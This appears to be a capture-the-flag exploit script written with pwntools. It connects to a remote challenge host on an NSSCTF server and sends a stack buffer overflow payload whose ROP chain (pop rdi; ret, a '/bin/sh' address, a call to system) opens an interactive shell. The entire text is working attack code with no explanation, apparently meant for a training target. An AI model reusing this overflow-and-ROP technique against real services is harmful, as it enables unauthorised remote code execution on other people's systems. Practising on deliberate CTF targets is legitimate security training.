from pwn import *

context(arch="amd64", os="linux", log_level="info")

context.gdb_binary = "/bin/pwndbg"
sh_addr = 0x400541
pop_rdi_ret_addr = 0x4005E3
system_call_addr = 0x400557

# io = process("./shell")
io = connect("node4.anna.nssctf.cn", 27239)

payload = b"a" * (0x10 + 0x8) + p64(pop_rdi_ret_addr) + p64(sh_addr) + p64(0x400557)
# gdb.attach(io)
io.sendline(payload)
io.interactive()
